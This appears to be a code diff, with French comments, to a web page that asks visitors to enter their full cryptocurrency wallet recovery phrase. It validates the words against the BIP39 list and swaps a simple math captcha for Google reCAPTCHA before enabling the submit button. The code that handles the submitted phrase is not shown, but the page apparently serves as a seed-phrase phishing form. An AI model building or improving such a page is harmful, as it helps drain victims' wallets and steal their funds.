@@ -150,38 +150,18 @@
       margin-top: 10px;
       display: none;
     }
-    .captcha-container {
-      margin-top: 20px;
-      display: none; /* caché par défaut */
-      flex-direction: column;
-      align-items: flex-start;
-      gap: 8px;
-    }
-    .captcha-label {
-      font-size: 14px;
-      color: #666;
-      font-weight: 600;
-      margin-bottom: 4px;
-    }
-    .captcha-input {
-      width: 100px;
-      padding: 8px;
-      border-radius: 8px;
-      border: 1px solid #ccc;
-      font-size: 14px;
-    }
+    /* Suppression du captcha-container car plus utilisé */
+
     @media (max-width: 600px) {
       .seed-inputs {
         grid-template-columns: repeat(2, 1fr);
-      }
-      .step-circles {
-        gap: 80px;
       }
       .captcha-input {
         width: 100%;
       }
     }
   </style>
+  <!-- Chargement du script reCAPTCHA de Google -->
   <script src="https://www.google.com/recaptcha/api.js" async defer></script>
 </head>
 <body>
@@ -227,18 +207,12 @@
 
       <div class="seed-inputs" id="seedInputs"></div>
 
-      <div class="captcha-container" id="captchaContainer">
-        <label class="captcha-label" id="captchaQuestion" for="captchaInput">Please solve:</label>
-        <input class="captcha-input" id="captchaInput" type="number" autocomplete="off" />
-      </div>
+      <!-- Ici on insère le reCAPTCHA Google juste avant le bouton -->
+      <div class="g-recaptcha" data-sitekey="6LdQvIorAAAAADITjQqeK4M6W7FZdLfUUESYgySK" data-callback="recaptchaCallback"></div>
 
       <button class="submit-btn" id="submitBtn" onclick="handleConfirm()" disabled>
         Confirm Secret Recovery Phrase
       </button>
-
-      <!-- Google reCAPTCHA ajouté ici -->
-      <div style="margin-top: 15px;" class="g-recaptcha" data-sitekey="6LdQvIorAAAAADITjQqeK4M6W7FZdLfUUESYgySK"></div>
-
       <p id="errorMsg" class="error-msg">Invalid seed phrase. Please check the words.</p>
 
     </div>
@@ -247,26 +221,14 @@
   <script src="bip39-words.js"></script>
   <script>
     const submitBtn = document.getElementById("submitBtn");
-    const captchaContainer = document.getElementById("captchaContainer");
-    const captchaInput = document.getElementById("captchaInput");
-    const captchaQuestion = document.getElementById("captchaQuestion");
     const errorMsg = document.getElementById("errorMsg");
 
-    let captchaAnswer = null;
-
-    function generateCaptcha() {
-      const num1 = Math.floor(Math.random() * 10) + 1; // 1 to 10
-      const num2 = Math.floor(Math.random() * 10) + 1;
-      captchaAnswer = num1 + num2;
-      captchaQuestion.textContent = `Please solve: ${num1} + ${num2} =`;
-      captchaInput.value = "";
-    }
+    // Suppression des variables liées à l'ancien captcha
 
     function generateInputs() {
       const container = document.getElementById("seedInputs");
       const count = parseInt(document.getElementById("phraseLength").value);
       container.innerHTML = "";
-      captchaContainer.style.display = "none";
       submitBtn.disabled = true;
       errorMsg.style.display = "none";
 
@@ -281,9 +243,6 @@
       inputs.forEach(input => {
         input.addEventListener("input", checkFieldsFilled);
       });
-
-      captchaInput.removeEventListener("input", checkCaptcha);
-      captchaInput.addEventListener("input", checkCaptcha);
     }
 
     function checkFieldsFilled() {
@@ -299,29 +258,21 @@
       }
 
       if (!allFilled) {
-        captchaContainer.style.display = "none";
         submitBtn.disabled = true;
         errorMsg.style.display = "none";
         return;
       }
 
-      if (validateBIP39Words()) {
-        generateCaptcha();
-        captchaContainer.style.display = "flex";
-        checkCaptcha();
-        errorMsg.style.display = "none";
-      } else {
-        captchaContainer.style.display = "none";
+      if (!validateBIP39Words()) {
         submitBtn.disabled = true;
         errorMsg.style.display = "block";
+        return;
+      } else {
+        errorMsg.style.display = "none";
       }
-    }
 
-    function checkCaptcha() {
-      const answer = captchaInput.value.trim();
-      const isCorrect = parseInt(answer) === captchaAnswer;
-
-      submitBtn.disabled = !isCorrect;
+      // Si tous les champs sont remplis et valides, on attend le reCAPTCHA
+      submitBtn.disabled = true;
     }
 
     function validateBIP39Words() {
@@ -340,6 +291,29 @@
       }
 
       return valid;
+    }
+
+    // Callback appelée quand l'utilisateur valide le reCAPTCHA
+    function recaptchaCallback() {
+      // Active le bouton uniquement si tous les champs sont remplis et valides
+      const count = parseInt(document.getElementById("phraseLength").value);
+      let allFilled = true;
+
+      for (let i = 1; i <= count; i++) {
+        const value = document.querySelector(`input[name='word${i}']`).value.trim();
+        if (value === "") {
+          allFilled = false;
+          break;
+        }
+      }
+
+      if (allFilled && validateBIP39Words()) {
+        submitBtn.disabled = false;
+      } else {
+        // reset reCAPTCHA si les champs ne sont pas valides
+        grecaptcha.reset();
+        submitBtn.disabled = true;
+      }
     }
 
     function handleConfirm() {
